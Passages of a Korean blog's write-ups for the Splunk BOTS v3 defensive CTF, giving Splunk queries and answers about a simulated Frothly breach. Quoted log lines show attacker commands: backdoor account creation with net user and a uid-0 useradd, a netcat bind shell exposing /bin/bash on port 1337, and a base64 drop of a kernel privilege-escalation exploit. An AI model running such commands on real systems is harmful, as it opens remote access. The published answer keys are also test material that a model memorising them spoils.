            "content": "Splunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과  secnario #1Note: All the information you need to answer each question is present within the question itself. You just need to figure out how to create the proper splunk search query that will get you the information you want.각 질문에 답하는 데 필요한 모든 정보는 질문 자체에 있습니다. 원하는 정보를 얻을 수 있는 적절한 splunk 검색 쿼리를 생성하는 방법을 알아내기만 하면 됩니다.BOTS-V3index=botsv3의 sourcetype은 아래와 같습니다.| metadata type=sourcetypes index=botsv3| stats values(sourcetype)  sourcetype 목록            values(sourcetype)                  PerfmonMk:Process              Script:GetEndpointInfo              Script:InstalledApps              Script:ListeningPorts              Unix:ListeningPorts              Unix:SSHDConfig              Unix:Service              Unix:Update              Unix:Uptime              Unix:UserAccounts              Unix:Version              WinHostMon              access_combined              alternatives              amazon-ssm-agent              amazon-ssm-agent-too_small              apache_error              aws:cloudtrail              aws:cloudwatch              aws:cloudwatch:guardduty              aws:cloudwatchlogs              aws:cloudwatchlogs:vpcflow              aws:config:rule              aws:description              aws:elb:accesslogs              aws:rds:audit              aws:rds:error              aws:s3:accesslogs              bandwidth              bash_history              bootstrap              cisco:asa              cloud-init              cloud-init-output              code42:api              code42:computer              code42:org              code42:security              code42:user              config_file              cpu              cron-too_small              df              dmesg              dpkg              error-too_small              errors              errors-too_small              ess_content_importer              hardware              history-2              interfaces              iostat              lastlog              linux_audit              linux_secure              localhost-5              lsof              maillog-too_small              ms:aad:audit              ms:aad:signin              ms:o365:management              ms:o365:reporting:messagetrace              netstat              o365:management:activity              openPorts              osquery:info              osquery:results              osquery:warning              out-3              package              protocol              ps              stream:arp              stream:dhcp              stream:dns              stream:http              stream:icmp              stream:igmp              stream:ip              stream:mysql              stream:smb              stream:smtp              stream:tcp              stream:udp              symantec:ep:agent:file              symantec:ep:agt_system:file              symantec:ep:behavior:file              symantec:ep:packet:file              symantec:ep:risk:file              symantec:ep:scm_system:file              symantec:ep:security:file              symantec:ep:traffic:file              syslog              time              top              usersWithLoginPrivs              vmstat              who              wineventlog              xmlwineventlog              yum-too_small      318\tFrom what country is a small brute force or password spray attack occurring against the Frothly web servers?Frothly 웹 서버에 대해 소규모 무차별 대입 공격 또는 암호 스프레이 공격이 어느 국가에서 발생합니까?  hint#1    Use linux_secure as the sourcetype.    sourcetype linux_secure에서 조사하세요.힌트에서 sourcetype linux_secure에 답이있다고 알려줍니다.linux_securevendor_action필드에 Invalid user란 값이있으니 조건을 추가해봅니다.sourcetype=linux_secure vendor_action=\"Invalid user\"해당 로그에서 발견한 IP는 5.101.40.81입니다.whois에 검색해봅시다.해당 IP국가는 러시아입니다.답 : RUSSIA319\tThe adversary created a BCC rule to forward Frothly’s email to his personal account. What is the value of the “Name” parameter set to?공격자는 Frothly의 이메일을 자신의 개인 계정으로 전달하는 BCC 규칙을 만들었습니다. “Name” 매개변수의 값은 무엇으로 설정되어 있습니까?  hint#1    Use ms:o365:management as the sourcetype.    sourcetype ms:o365:management에서 조사하세요.BCC룰이란?BCC는 숨은참조입니다. 숨은참조 룰을 찾아봅시다.sourcetype=ms:o365:management *Frothly* *Name* (*bcc* OR *Rule* OR *Blind*Carbon*Copy*)공격자의 메일주소 hyunki1984@naver.com로 BlindCopyTo를 보내는 New-TransportRule룰을 생기는 이벤트입니다.답 : SOX320\tWhat is the password for the user that was created on the compromised endpoint?손상된 엔드포인트에서 생성된 사용자의 비밀번호는 무엇입니까?  hint#1    Use WinEventLog:Security as the sourcetype.    sourcetype WinEventLog:Security에서 조사하세요.svcvnc를 키워드로 검색하면 아래와 같은 이벤트를 발견할 수 있습니다.Process Command Line:\tC:\\Windows\\system32\\net1 user /add svcvnc Password123!답 : Password123!321\tThe Taedonggang adversary sent Grace Hoppy an email bragging about the successful exfiltration of customer data. How many Frothly customer emails were exposed or revealed?대동강은 Grace Hoppy에게 성공적인 고객 데이터 유출에 대해 자랑하는 이메일을 보냈습니다. 얼마나 많은 Frothly 고객 이메일이 노출되거나 공개되었습니까?  hint#1    Use stream:smtp as the sourcetype.    sourcetype stream:smtp에서 조사하세요.Grace Hoppy의 이메일주소는 ghoppy@froth.ly입니다.smtp에서 수신자 ghoppy@froth.ly인 이벤트를 찾아봅시다.sourcetype=stream:smtp receiver_email{}=ghoppy@froth.lysender_email이 hyunki1984@naver.com인 이벤트가 1개있습니다.base64인코딩된 데이터를 디코딩해봅시다.R3JhY2llLAoKICAgICAgIFdlIGJyb3VnaHQgeW91ciBkYXRhIGFuZCBpbXBvcnRlZCBpdDogaHR0cHM6Ly9wYXN0ZWJpbi5jb20vc2RCVWt3c0UgQWxzbywgeW91IHNob3VsZCBub3QgYmUgdG9vIGhhcmQgQnJ1Y2UuIEhlIGdvb2QgbWFuIAogCiAKIAogCg==(Decoding)→Gracie,We brought your data and imported it: https://pastebin.com/sdBUkwsE Also, you should not be too hard Bruce. He good man 해당 url로 가보면 총 8명입니다.답 : 8322\tWhat is the path of the URL being accessed by the command and control server? Answer guidance: Provide the full path. (Example: The full path for the URL https://imgur.com/a/mAqgt4S/lasd3.jpg is /a/mAqgt4S/lasd3.jpg)명령 및 제어 서버가 액세스하는 URL의 경로는 무엇입니까? 답변 안내: 전체 경로를 제공하세요. (예: https://imgur.com/a/mAqgt4S/lasd3.jpg URL의 전체 경로는 /a/mAqgt4S/lasd3.jpg입니다.)  hint#1    Start with XmlWinEventLog:Microsoft-Windows-Sysmon/Operational as the sourcetype, or review the PowerShell logging on various Frothly laptops.    XmlWinEventLog:Microsoft-Windows-Sysmon/Operational을 소스 유형으로 시작하거나 다양한 Frothly 랩톱에서 PowerShell 로깅을 검토합니다.323\tAt least two Frothly endpoints contact the adversary’s command and control infrastructure. What are their short hostnames? Answer guidance: Comma separated without spaces, in alphabetical order.최소 2개의 Frothly 엔드포인트가 적의 명령 및 제어 인프라에 접속합니다. 짧은 호스트 이름은 무엇입니까? 답변 안내: 알파벳 순서로 공백 없이 쉼표로 구분됩니다.  hint#1    324\tWho is Al Bungstein’s cell phone provider/carrier? Answer guidance: Two words.324 Al Bungstein의 휴대전화 제공업체/이동통신사는 누구인가요? 답변 안내: 두 단어.  hint#1    How can you find out what external IP address Al Bungstein is using?    Al Bungstein이 사용하는 외부 IP 주소를 어떻게 알 수 있습니까?  hint#2    OSINT is your friend here. Pivot off of Al's external IP.    OSINT는 여기 당신의 친구입니다. Al의 외부 IP를 피벗합니다.  hint#3    There is a single sourcetype in Splunk that also contains this information. It is a scripted input running on Al's machine.    Splunk에는 이 정보도 포함하는 단일 소스 유형이 있습니다. Al의 시스템에서 실행되는 스크립트 입력입니다.Al Bungstein의 이메일은 abungstein@froth.ly입니다.ip : 174.215.1.81해당 ip를 whois에 조회해보면답 : Verizon Wireless325\tMicrosoft cloud services often have a delay or lag between “index time” and “event creation time”. For the entire day, what is the max lag, in minutes, for the sourcetype: ms:aad:signin? Answer guidance: Round to the nearest minute without the unit of measure.Microsoft 클라우드 서비스는 종종 “인덱스 시간”과 “이벤트 생성 시간” 사이에 지연 또는 지연이 있습니다. 전체일 중 ms:aad:signin의 최대 지연 시간(분)은 얼마입니까? 답변 안내: 측정 단위 없이 가장 가까운 분으로 반올림합니다.  hint#1sourcetype=ms:aad:signin  | eval indextime=strftime(_indextime,\"%Y-%m-%d %H:%M:%S\") | eval time=strftime(_time,\"%Y-%m-%d %H:%M:%S\") | eval indextime_epoch=strptime(indextime,\"%Y-%m-%d %H:%M:%S\")| eval time_epoch=strptime(time, \"%Y-%m-%d %H:%M:%S\")| table time, indextime, indextime_epoch, time_epoch| eval delta=indextime_epoch-time_epoch| stats max(delta) as max_lag| eval minutes=max_lag / 60326\tAccording to Mallory’s advertising research, how is beer meant to be enjoyed? Answer guidance: One word.Mallory의 광고 연구에 따르면 맥주는 어떻게 즐길 수 있습니까? 답변 안내: 한 마디.  hint#1    327도 문제 없습니다.328\tWhat text is displayed on line 2 of the file used to escalate tomcat8’s permissions to root? Answer guidance: Provide contents of the entire line.tomcat8의 권한을 루트로 에스컬레이션하는 데 사용되는 파일의 2행에 어떤 텍스트가 표시됩니까? 답변 안내: 전체 라인의 내용을 제공합니다.  hint#1    Start with any sourcetype that provides detailed process execution data, or one that provides clear-text details of information posted to the Linux host hoth.    자세한 프로세스 실행 데이터를 제공하는 소스 유형이나 Linux 호스트 hoth에 게시된 정보의 일반 텍스트 세부 정보를 제공하는 소스 유형으로 시작하십시오.  hint#2    You are looking for a long string of base64 information.    긴 base64 정보 문자열을 찾고 있습니다.osquery에 실행관련 이벤트가 있을것입니다. 어떤 계정이 어떤 명령을 실행했는지 조사해봅니다.sourcetype=osquery:results tomcat8 columns.cmdline=*| table _time decorations.username columns.cmdline| reverse중간에 “chmod” “+x” “colonelnew”, ”./colonelnew”의 이벤트를 발견할 수 있습니다. colonelnew은 315번문제에서 발견한 파일과 비슷합니다. sourcetype sysmon에서 cat colonel.c의 로그가 있었습니다.*colonel* source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\"중간 C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe” http://192.168.9.30:8080/frothlyinventory/showcase.action “echo Ly…. &gt;&gt; /tmp/colonel과 같은 명령어가 보입니다.해당 base64를 /tmp/colonel파일로 옮기는것처럼 보입니다. 해당 데이터를 base64로 디코딩해봅니다.시작 : LyoKICogVWJ1bnR1IDE2끝 : JldHVybiAwOwp9 &gt;&amp;gt답 :  * Ubuntu 16.04.4 kernel priv esc329\tOne of the files uploaded by Taedonggang contains a word that is a much larger in font size than any other in the file. What is that word?대동강이 업로드한 파일 중 하나에는 파일의 다른 어떤 것보다 훨씬 큰 글자 크기의 단어가 포함되어 있습니다. 그 단어는 무엇입니까?  hint#1    Figure out what files were uploaded, and pivot off of interesting file names found. The WinEventLog:Security sourcetype is helpful, as is the osquery:results sourcetype.    어떤 파일이 업로드되었는지 파악하고 발견된 흥미로운 파일 이름을 중심으로 중심을 잡습니다. WinEventLog:Security 소스 유형은 osquery:results 소스 유형과 마찬가지로 유용합니다.  hint#2    You are looking for a long string of base64 information.    긴 base64 정보 문자열을 찾고 있습니다.  hint#3    You will need to find a site to decode the base64 to a viewable image. CyberChef is a good one!    base64를 볼 수 있는 이미지로 디코딩하려면 사이트를 찾아야 합니다. CyberChef는 좋은 사람입니다!지금까지 문제에서 대동강그룹이 업로드한 파일은 colonel, Frothly_GABF_Deck-2018-MK.pptx, 1534778082419.png, definitelydontinvestigatethisfile.sh로 파악했습니다.각 검색하여 base64 디코딩해봅시다.definitelydontinvestigatethisfile.sh를 검색해보면sysmon에 아래 base64 코드들이 있습니다.시작 : /9j/4AAQSkZJRgABAQAAAQABAAD/끝 : BvdGF0byBwaG9uZQo=해당 데이터를 디코드해보면 아래와 같습니다. 답 : splunk330\tWhat Frothly VPN user generated the most traffic? Answer guidance: Provide the VPN user name.어떤 Frothly VPN 사용자가 가장 많은 트래픽을 생성했습니까? 답변 안내: VPN 사용자 이름을 제공합니다.  hint#1    Start with cisco:asa as the sourcetype.    sourcetype cisco:asa에서 조사하십시오.sourcetype=cisco:asa eventtype=cisco_vpn| stats count by Cisco_ASA_user| sort -count            Cisco_ASA_user      count                  mkraeusen      38              bstoll      36              bgist      19              fyodor      14              pcerf      13              ghoppy      5              btun      3              abungstein      2      답 : mkraeusen331\tUsing Splunk commands only, what is the upper fence (UF) value of the interquartile range (IQR) of the count of event code 4688 by Windows hosts over the entire day? Use a 1.5 multiplier. Answer guidance: UF = Q3 + 1.5 x IQRSplunk 명령만 사용하는 경우 하루 종일 Windows 호스트의 이벤트 코드 4688 수에 대한 사분위수 범위(IQR)의 상한(UF) 값은 얼마입니까? 1.5 배율을 사용하십시오. 답변 안내: UF = Q3 + 1.5 x IQR  hint#1    Start with WinEventLog:Security as the sourcetype.    sourcetype WinEventLog:Security를 조사하십시오.  hint#2    Splunk commands such as eventstats, perc25() and perc75() would be helpful here.    여기에서 eventstats, perc25() 및 perc75()와 같은 Splunk 명령이 도움이 될 것입니다.  hint#3    If you have never used the interquartile range (IQR) to identify outliers, take a look at the documentation https://docs.splunk.com/Documentation/Splunk/latest/Search/Findingandremovingoutliers#Use_the_interquartile_range_.28IQR.29_to_identify_outliers    사분위수 범위(IQR)를 사용하여 이상값을 식별한 적이 없는 경우 https://docs.splunk.com/Documentation/Splunk/latest/Search/Findingandremovingoutliers#Use_the_interquartile_range_.28IQR.29_to_identify_outliers 문서를 참조하십시오.eventcode4688새 process creation 이벤트 코드입니다.sourcetype=wineventlog EventCode=4688| eventstats perc25(count) as p25, perc75(count) as p75| eval IQR=p75-p25| eval UF=p75+1.5*IQR답 : 1368332\tWhat is the CVE of the vulnerability that escalated permissions on Linux host hoth? Answer guidance: Submit in normal CVE format. (Example: cve-2018-9805)Linux 호스트 hoth에서 권한을 에스컬레이션한 취약점의 CVE는 무엇입니까? 답변 안내: 일반 CVE 형식으로 제출하십시오. (예: cve-2018-9805)  hint#1    Start with any sourcetype that provides detailed process execution data, or one that provides clear-text details of information posted to the Linux host hoth.    자세한 프로세스 실행 데이터를 제공하는 소스 유형이나 Linux 호스트 hoth에 게시된 정보의 일반 텍스트 세부 정보를 제공하는 소스 유형으로 시작하십시오.  hint#2    You are looking for a long string of base64 information.    긴 base64 정보 문자열을 찾고 있습니다.  hint#3    Google search.    구글링 하세요.328번문제에서 발견한 “* Ubuntu 16.04.4 kernel priv esc”를 구글링해봅시다.CVE-2017-16995답 : CVE-2017-16995333\tWhat is the CVE of the vulnerability that was exploited to run commands on Linux host hoth? Answer guidance: Submit in normal CVE format. (Example: cve-2018-9805)Linux 호스트 hoth에서 명령을 실행하기 위해 악용된 취약점의 CVE는 무엇입니까? 답변 안내: 일반 CVE 형식으로 제출하십시오. (예: cve-2018-9805)  hint#1    ",
        "url": "/splunk-BOTS-v3-part4"
    }
    ,
    
    "splunk-bots-v3-part3": {
        "title": "splunk-bots-v3 write up(3)",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과  secnario #1Note: All the information you need to answer each question is present within the question itself. You just need to figure out how to create the proper splunk search query that will get you the information you want.각 질문에 답하는 데 필요한 모든 정보는 질문 자체에 있습니다. 원하는 정보를 얻을 수 있는 적절한 splunk 검색 쿼리를 생성하는 방법을 알아내기만 하면 됩니다.BOTS-V3index=botsv3의 sourcetype은 아래와 같습니다.| metadata type=sourcetypes index=botsv3| stats values(sourcetype)  sourcetype 목록            values(sourcetype)                  PerfmonMk:Process              Script:GetEndpointInfo              Script:InstalledApps              Script:ListeningPorts              Unix:ListeningPorts              Unix:SSHDConfig              Unix:Service              Unix:Update              Unix:Uptime              Unix:UserAccounts              Unix:Version              WinHostMon              access_combined              alternatives              amazon-ssm-agent              amazon-ssm-agent-too_small              apache_error              aws:cloudtrail              aws:cloudwatch              aws:cloudwatch:guardduty              aws:cloudwatchlogs              aws:cloudwatchlogs:vpcflow              aws:config:rule              aws:description              aws:elb:accesslogs              aws:rds:audit              aws:rds:error              aws:s3:accesslogs              bandwidth              bash_history              bootstrap              cisco:asa              cloud-init              cloud-init-output              code42:api              code42:computer              code42:org              code42:security              code42:user              config_file              cpu              cron-too_small              df              dmesg              dpkg              error-too_small              errors              errors-too_small              ess_content_importer              hardware              history-2              interfaces              iostat              lastlog              linux_audit              linux_secure              localhost-5              lsof              maillog-too_small              ms:aad:audit              ms:aad:signin              ms:o365:management              ms:o365:reporting:messagetrace              netstat              o365:management:activity              openPorts              osquery:info              osquery:results              osquery:warning              out-3              package              protocol              ps              stream:arp              stream:dhcp              stream:dns              stream:http              stream:icmp              stream:igmp              stream:ip              stream:mysql              stream:smb              stream:smtp              stream:tcp              stream:udp              symantec:ep:agent:file              symantec:ep:agt_system:file              symantec:ep:behavior:file              symantec:ep:packet:file              symantec:ep:risk:file              symantec:ep:scm_system:file              symantec:ep:security:file              symantec:ep:traffic:file              syslog              time              top              usersWithLoginPrivs              vmstat              who              wineventlog              xmlwineventlog              yum-too_small      300\tWhat is the full user agent string that uploaded the malicious link file to OneDrive?OneDrive에 악성 링크 파일을 업로드한 전체 사용자 에이전트 문자열은 무엇입니까?  hint#1    Use ms:o365:management as the sourcetype for OneDrive activity.    OneDrive 활동의 원본 유형으로 ms:o365:management를 사용합니다.  hint#2    A link (or .lnk) file is a shortcut file. Look for link files that are associated with OneDrive.    링크(또는 .lnk) 파일은 바로 가기 파일입니다. OneDrive와 연결된 링크 파일을 찾습니다.  hint#3    Filter your search to just upload activity.    활동을 업로드하기 위해 검색을 필터링하십시오.OneDrive를 검색하니 sourcetype이 ms:o365:management, o365:management:activity 두가지가 나옵니다.두가지 sourcetype의 필드를 조사해보니 Operation의 필드에 FileUploaded라는 값이 있습니다.이 sourcetype에 UserAgent 필드가 있으므로 해당 값이 답일것입니다.OneDrive .lnk Operation=FileUploaded| table UserAgent답 : Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4301\tWhat external client IP address is able to initiate successful logins to Frothly using an expired user account?만료된 사용자 계정을 사용하여 Frothly에 성공적으로 로그인할 수 있는 외부 클라이언트 IP 주소는 무엇입니까?  hint#1    Use ms:aad:signin as the sourcetype for Azure Active Directory sign-in activity.    Azure Active Directory 로그인 활동의 소스 유형으로 ms:aad:signin을 사용합니다.로그인관련 이벤트는 AD에있을것입니다. sourcetype에 ms:aad:signin란 sourcetype이 있습니다.expired 키워드로 조사해봅니다.sourcetype=ms:aad:signin expiredID는 Kevin Lagerfield, ip는 199.66.91.253, expired된 비밀번호로 로그인을 시도했습니다.해당 정보로 다시 검색해봅니다.sourcetype=ms:aad:signin \"Kevin Lagerfield\" 199.66.91.253해당 계정으로 로그인을 성공한 이벤트를 발견할 수 있습니다.답 : 199.66.91.253302\tAccording to Symantec’s website, what is the discovery date of the malware identified in the macro-enabled file? Answer guidance: Provide the US date format MM/DD/YY. (Example: January 1, 2019 should be provided as 01/01/19)시만텍 웹사이트에 따르면 매크로 실행 파일에서 식별된 악성코드의 발견 날짜는 언제입니까? 답변 안내: 미국 날짜 형식 MM/DD/YY를 제공하십시오. (예시: 2019년 1월 1일은 01/01/19로 제공되어야 함)  hint#1    Use ms:aad:signin as the sourcetype for Azure Active Directory sign-in activity.    Azure Active Directory 로그인 활동의 소스 유형으로 ms:aad:signin을 사용합니다.  hint#2    Use WinEventLog:Application as the sourcetype to identify the security risk found.    WinEventLog:Application을 소스 유형으로 사용하여 발견된 보안 위험을 식별합니다.          hint#3    Google search for that risk and the term Symantec together.    Google에서 해당 위험과 Symantec이라는 용어를 함께 검색합니다.조사 방향을 잡기힘드니 macro로 검색해봅니다.*macro*그럼 19개의 이벤트가 발생하는데, stream:smtp로그가 눈에 띕니다.첨부파일 Malware Alert Text.txt의 base64 인코딩값을 발견할 수 있습니다. 디코딩해봅시다.Malware was detected in one or more attachments included with this email message. Action: All attachments have been removed.Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm\t W97M.Empstage추후 마저 풀겠음303\tWhat is the password for the user that was successfully created by the user “root” on the on-premises Linux system?온프레미스 Linux 시스템에서 사용자 “루트”가 성공적으로 생성한 사용자의 비밀번호는 무엇입니까?  hint#1    Use osquery:results as the sourcetype.    sourcetype osquery:results에서 조사하세요.  hint#2    Osquery is logging command executions on the Linux host hoth.    Osquery는 Linux 호스트 hoth에서 명령 실행을 기록하고 있습니다.linux에서 사용자 추가명령어는 useradd 혹은 adduser입니다.sourcetype=osquery:results *useradd* OR *adduser*이벤트2개가 뜹니다.cmdline: “useradd” “-ou” “tomcat7” “-p” “ilovedavidverve” “0” “-g” “0” “-M” “-N” “-r” “-s” “/bin/bash”cmdline: “useradd” “-ou” “tomcat7” “-p” “davidverve.com” “0” “-g” “0” “-M” “-N” “-r” “-s” “/bin/bash”이중, 실행한 uid가 0인 이벤트의 비밀번호값은 ilovedavidverve입니다.답 : ilovedavidverve304\tWhat is the name of the user that was created after the endpoint was compromised?엔드포인트가 손상된 후 생성된 사용자의 이름은 무엇입니까?  hint#1    Use WinEventLog:Security as the sourcetype.    WinEventLog:Security를 ​​소스 유형으로 사용하십시오.    엔드포인트라고 했으니, 윈도우 시스템일 것입니다. 이벤트로그에서 계정생성 이벤트를 찾아봅시다.구글에 검색하니 계정생성 윈도우이벤트로그 ID는 4720입니다.sourcetype=WinEventLog EventCode=4720한개의 이벤트가 나옵니다. Account Name:\t\tsvcvnc답 : svcvnc305\tWhat is the process ID of the process listening on a “leet” port?“leet” 포트에서 수신 대기하는 프로세스의 프로세스 ID는 무엇입니까?  hint#1    Use osquery:results as the sourcetype.    osquery:results를 소스 유형으로 사용하십시오.  hint#2    Osquery is logging open ports found on the Linux host hoth.    Osquery는 Linux 호스트 hoth에서 발견된 열린 포트를 기록하고 있습니다.leet는 1337포트를 사용하는 서비스입니다. PID는 sourcetype ps에서 확인할 수 있을것입니다.1337 sourcetype=ps  결과    root             14356     0      0.0      00:00:00     0.1       1732       6492   ?        S         31:58  netcat              -v_-l_-p_1337_-e_/bin/bash        pid는 14356임을 알 수 있습니다.  답 : 14356306\tA search query originating from an external IP address of Frothly’s mail server yields some interesting search terms. What is the search string?Frothly 메일 서버의 외부 IP 주소에서 시작되는 검색 쿼리는 몇 가지 흥미로운 검색어를 생성합니다. 검색 문자열은 무엇입니까?  hint#1    Use o365:management:activity as the sourcetype.    sourcetype o365:management:activity에서 조사하십시오.ms office를 사용하는것을 알고있으니, Outlook 혹은 Exchange를 사용할 것입니다. o365관련 sourcetype에서 키워드 query를 조사해봅니다.sourcetype=*o365* (Exchange OR Outlook) *query*아래와 같은 로그를 발견할 수 있습니다.ClientIP: 104.207.83.63:21974user: fyodor@froth.lyWorkload: ExchangeUserKey: 1003BFFDA2E71FF9UserType: 2Name: SearchQueryValue: cromdale OR beer OR financial OR secret답 : cromdale OR beer OR financial OR secret307\tWhat is the MD5 value of the file downloaded to Fyodor’s endpoint system and used to scan Frothly’s network?Fyodor의 엔드포인트 시스템에 다운로드되어 Frothly의 네트워크를 스캔하는 데 사용되는 파일의 MD5 값은 무엇입니까?  hint#1    실행파일의 hash값은 sysmon로그에 있습니다.sourcetype으로 제공되지않고, source로 제공합니다.파일이 실행됐다면 process creation이벤트가 발생했을것입니다.(EventID=1)어떤 파일이 실행됐는지 파악할 수 있도록 Image필드의 값을 봅시다.host=FYODOR-L source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventID=1 | stats count by ImageImages 중 “C:\\Windows\\Temp\\hdoor.exe”라는 특이한 실행파일이 보입니다.CommandLine을 보면 “C:\\windows\\temp\\hdoor.exe” -hbs 192.168.9.1-192.168.9.50 /b /m /n 식으로 네트워크 대역관련 인자가 보입니다.답 : 586EF56F4D8963DD546163AC31C865D7308\tBased on the information gathered for question 304, what groups was this user assigned to after the endpoint was compromised? Answer guidance: Comma separated without spaces, in alphabetical order.문제 304에 대해 수집된 정보에 따르면 엔드포인트가 손상된 후 이 사용자는 어떤 그룹에 할당되었습니까? 답변 안내: 알파벳 순서로 공백 없이 쉼표로 구분됩니다.  hint#1    계정명 svcvnc의 그룹을 알아봅시다.sysmon Group할당eventID는 4732입니다.svcvnc EventCode=4732이벤트 2개가 나옵니다.답 : Administrators,Users309\tAt some point during the attack, a user’s domain account is disabled. What is the email address of the user whose account gets disabled and what is the email address of the user who disabled their account? Answer guidance: Comma separated without spaces, in alphabetical order. (Example: jdoe@mycompany.com,tmiller@mycompany.com)공격 중간에 어느 시점에서 사용자의 도메인 계정이 비활성화됩니다. 계정이 비활성화된 사용자의 이메일 주소는 무엇이며 계정을 비활성화한 사용자의 이메일 주소는 무엇입니까? 답변 안내: 알파벳 순서로 공백 없이 쉼표로 구분됩니다. (예: jdoe@mycompany.com,tmiller@mycompany.com)  hint#1    sysmon account disableeventID는 4725입니다.EventCode=4725아무이벤트도 나오지 않습니다.AD에서 찾아봅시다.sourcetype=ms:aad:* *user* OR *account* OR *disable*activity라는 필드에 Disable account가 보입니다.sourcetype=ms:aad:* activity=\"Disable account\"actor부분에 fyodor@froth.ly라는 이메일계정을 발견할 수 있습니다.target을 보면 bgist@froth.ly라는 이메일계정또한 발견할 수 있습니다.답 : bgist@froth.ly,fyodor@froth.ly310\tAnother set of phishing emails were sent to Frothly employees after the adversary gained a foothold on a Frothly computer. This malicious content was detected and left behind a digital artifact. What is the name of this file? Answer guidance: Include the file extension. (Example: badfile.docx)공격자가 Frothly 컴퓨터에 발판을 마련한 후 또 다른 피싱 이메일 세트가 Frothly 직원에게 전송되었습니다. 이 악성 콘텐츠는 감지되어 디지털 아티팩트를 남겼습니다. 이 파일의 이름은 무엇입니까? 답변 지침: 파일 확장자를 포함합니다. (예: badfile.docx)  hint#1    문제 302번에서 발견한 Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm파일이 생각납니다. 해당 파일명으로 검색해보면 auto-sacning되어 지워졌음을 확인할 수 있습니다.답 : Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm311\tBased on the answer to question 310, what is the name of the executable that was embedded in the malware? Answer guidance: Include the file extension. (Example: explorer.exe)310번 문제에 대한 답변에 따르면 악성코드에 포함된 실행 파일의 이름은 무엇입니까? 답변 지침: 파일 확장자를 포함합니다. (예: explorer.exe)  hint#1    바로 다음이벤트의 Image에 exe파일이 있습니다.답 : HxTsr.exe312\tHow many unique IP addresses “used” the malicious link file that was sent?전송된 악성 링크 파일을 “사용”한 고유 IP 주소는 몇 개입니까?  hint#1    300번문제에서 파악한 악성 링크파일의 이름은 BRUCE BIRTHDAY HAPPY HOUR PICS.lnk입니다.\"BRUCE BIRTHDAY HAPPY HOUR PICS.lnk\"67개의 이벤트가 있습니다.그중 operation field값 중 AnonymousLinkUsed이 눈에 띕니다.\"BRUCE BIRTHDAY HAPPY HOUR PICS.lnk\"  Operation=AnonymousLinkUsed| stats dc(ClientIP)답 : 7313문제도 없네요314\tWhat port number did the adversary use to download their attack tools?공격자가 공격 도구를 다운로드하는 데 사용한 포트 번호는 무엇입니까?  hint#1    stream:tcp에서 조사해봅니다.well-known포트가 아닌 포트 중 한번만 다운로드 한 이벤트를 찾아봅시다.sourcetype=stream:tcp| stats count by dest_port45.77.53.176:3333과 192.168.8.103:50504가 count 1입니다.외부망 IP인 45.77.53.176이 의심스럽습니다.stream:http에서 확인해봅시다.uri_path: /images/logos.png를 발견할 수 있습니다.답 : 3333315\tDuring the attack, two files are remotely streamed to the /tmp directory of the on-premises Linux server by the adversary. What are the names of these files? Answer guidance: Comma separated without spaces, in alphabetical order, include the file extension where applicable.공격하는 동안 공격자는 온프레미스 Linux 서버의 /tmp 디렉터리에 두 개의 파일을 원격으로 스트리밍합니다. 이 파일의 이름은 무엇입니까? 답변 안내: 알파벳 순서로 공백 없이 쉼표로 구분하고 해당되는 경우 파일 확장자를 포함합니다.  hint#1    file upload 관련 로그는 osquery에 있을것입니다. create, upload관련 행위를 하는 데이터를 찾아봅시다.sourcetype=osquery:results */tmp*.* \"columns.action\"=CREATEDcreate한 user 중 tomcat8을 발견할 수 있습니다. tomcat7이 악성행위하는 계정을 생성했으니 해당 계정도 의심스럽습니다.sourcetype=osquery:results */tmp*.* \"columns.action\"=CREATED \"decorations.username\"=tomcat8| table columns.target_path            columns.target_path                  /tmp/ccgZ61x9.o              /tmp/cclBJ1WV.s              /tmp/colonel.c              /tmp/definitelydontinvestigatethisfile.sh      실행파일은 colonel.c와 definitelydontinvestigatethisfile.sh입니다.316\tBased on the information gathered for question 314, what file can be inferred to contain the attack tools? Answer guidance: Include the file extension.314번 문제에 대해 수집된 정보를 바탕으로 공격 도구가 포함된 것으로 유추할 수 있는 파일은 무엇입니까? 답변 지침: 파일 확장자를 포함합니다.  hint#1    답 : logos.png317\tWhat is the first executable uploaded to the domain admin account’s compromised endpoint system? Answer guidance: Include the file extension.도메인 관리자 계정의 손상된 엔드포인트 시스템에 업로드된 첫 번째 실행 파일은 무엇입니까? 답변 지침: 파일 확장자를 포함합니다.  hint#1    domain admin의 GUI는 (S-1-5-21*-512)[https://docs.microsoft.com/en-US/windows/security/identity-protection/access-control/security-identifiers]과 같습니다.이 키워드로 검색해도 아무것도 나오지않습니다.sysmon에서 .exe확장자 파일을 검색해봅니다. 악성코드는 보통 tmp, temp파일에 업로드하니 경로조건도 추가해봅니다.*.exe source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" Image IN(*tmp*, *temp*)| stats count by Image            Image      count                  C:\\Users\\ALBUNG~1\\AppData\\Local\\Temp\\632F4847-CD24-4609-823F-C2C020FD03EB\\DismHost.exe      2              C:\\Users\\BRUCEG~1\\AppData\\Local\\Temp\\GUM4F89.tmp\\DropboxUpdate.exe      9              C:\\Users\\BruceGist\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\DropboxInstaller.exe      6              C:\\Users\\FYODOR~1\\AppData\\Local\\Temp\\3F5D15FE-AD68-4E1F-B3C4-90E199AF3640\\DismHost.exe      2              